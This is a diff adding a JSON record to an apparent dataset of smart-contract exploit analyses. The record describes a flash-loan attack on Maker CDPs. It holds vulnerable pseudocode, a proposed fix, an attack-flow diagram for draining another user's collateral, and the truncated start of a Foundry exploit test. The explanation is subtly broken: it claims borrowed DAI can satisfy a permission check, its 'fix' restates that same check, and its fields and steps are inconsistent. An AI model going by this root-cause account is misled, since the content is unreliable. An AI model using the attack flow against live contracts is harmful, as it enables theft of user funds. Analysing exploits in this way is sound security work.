@@ -1,0 +1,32 @@
+{
+ "id": "2022__2022-08_Circle_MakerCDP_FlashLoan",
+ "source_file": "2022/2022-08_Circle_MakerCDP_FlashLoan.md",
+ "title": "Circle/Maker CDP — Flash Loan CDP Position Manipulation Attack Analysis",
+ "date": "2022-08-01",
+ "protocol": "Maker Protocol",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": "Insufficient access control in `frob()` and `flux()` allowing withdrawal of collateral from another user's CDP position",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable frob() - access control condition can be bypassed\n// Maker Vat frob function (pseudocode)\nfunction frob(\n    bytes32 ilk,\n    address u,    // collateral owner\n    address v,    // collateral source\n    address w,    // debt destination\n    int dink,     // collateral delta\n    int dart      // debt delta\n) external {\n    //",
+  "❌ Passes when u, v, w all satisfy wish() conditions\n    // Depositing large amounts of DAI via flash loan can artificially satisfy the conditions\n    require(either(dink >= 0, wish(u, msg.sender)), \"not allowed u\");\n    require(either(dart <= 0, wish(w, msg.sender)), \"not allowed w\");\n    require(either(dart >= 0 && dink <= 0, safe(ilk, u)), \"not safe\");\n}\n\n// flux() - collateral transfer\nfunction flux(bytes32 ilk, address src, address dst, uint256 wad) external {\n    //",
+  "❌ Insufficient check whether src has granted permission to msg.sender\n    require(wish(src, msg.sender));\n    // Execute collateral transfer\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern - only explicit delegation permitted\nfunction flux(bytes32 ilk, address src, address dst, uint256 wad) external {\n    require(src == msg.sender || can[src][msg.sender] == 1, \"not authorized\");\n}"
+ ],
+ "steps": [
+  "[5] Burn UniV2 LP tokens → obtain DAI + USDC",
+  "[7] Repay flash loan → net profit $50,500 (exp1) / $151,600 (exp2)"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Maker.flashLoan(~2.4 trillion DAI)\n    │       └─ onFlashLoan() callback entered\n    │\n    ├─[2] Deposit DAI into CDP #28,311\n    │       └─ vat.frob(ilk, cdp, 0, deposit_amount) - debt increased\n    │\n    ├─[3] Adjust CDP position via frob() (access control bypass)\n    │       └─ dink < 0: collateral reduced, dart < 0: debt reduced\n    │\n    ├─[4] Transfer Uniswap V2 LP tokens to attacker address via flux()\n    │\n    ├─[5] Burn UniV2 LP tokens → obtain DAI + USDC\n    │\n    ├─[6] Convert USDC to DAI via sellGem()\n    │\n    └─[7] Repay flash loan → net profit $50,500 (exp1) / $151,600 (exp2)",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IMakerPool {\n    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;\n}\n\ninterface IMakerVat {\n    function frob(bytes32, address, address, address, int256, int256) external;\n    function flux(bytes32, address, address, uint256) external;\n    function move(address, address, uint256) external;\n    function urns(bytes32, address) external view returns (uint256 ink, uint256 art);\n}\n\ninterface IMakerManager {\n    function cdpAllow(uint256, address, uint256) external;\n    function frob(uint256, int256, int256) external;\n    function flux(uint256, address, uint256) external;\n    function ilks(uint256) external view returns (bytes32);\n    function "
+ ]
+}
